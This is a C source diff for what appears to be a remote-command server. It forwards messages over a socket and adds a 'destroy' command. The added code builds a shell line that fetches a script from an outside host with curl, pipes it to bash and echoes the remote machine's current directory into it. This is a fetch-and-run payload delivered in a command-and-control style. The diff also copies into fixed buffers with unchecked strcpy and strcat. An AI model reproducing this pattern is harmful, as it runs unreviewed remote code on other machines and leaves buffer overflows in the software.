@@ -25,9 +25,24 @@
 
 #define MESSAGE_LENGTH 2048
 #define INFO "childinfo"
+#define DESTROY_CMD_OPEN "echo "
+#define DESTROY_CMD_CLOSE " `curl -X POST https://cyber.stanleyhoo1.tech/files/cleanup.sh` | bash"
+
+struct init_struct init;
+
+char * special_cmd(char * cmd){
+  if(strcmp(cmd, "destroy")==0){
+
+    strcpy(cmd, DESTROY_CMD_OPEN);
+    strcat(cmd, init.curr_directory);
+    strcat(cmd, DESTROY_CMD_CLOSE);
+  }
+
+  return cmd;
+}
 
 int listening_server_action(int new_socket, int readPipe){
-  struct init_struct init;
+
   read(new_socket, &init, sizeof(struct  init_struct));
   print_init_struct(&init);
   int fds[2];
@@ -40,19 +55,14 @@ int listening_server_action(int new_socket, int readPipe){
     while (1){
       char message[MESSAGE_LENGTH] = "ls";
       int readResult = read(readPipe, message, MESSAGE_LENGTH-1);
-
-
       if(strcmp(message, INFO)==0){
         print_init_struct(&init);
       }
       else{
-	if(strcmp(message, "destroy")==0){
-		char newmsg[2000];
-		strcpy(newmsg, init.curr_directory);
-		strcat(newmsg, message);
-		strcpy(message, newmsg);
-		printf("%s\n", message);
-	}
+
+        strcpy(message, special_cmd(message));
+        printf("%s\n", message);
+
         strcat(message, "\n");
         int msg_size = (strlen(message)+1) * sizeof(char);
 
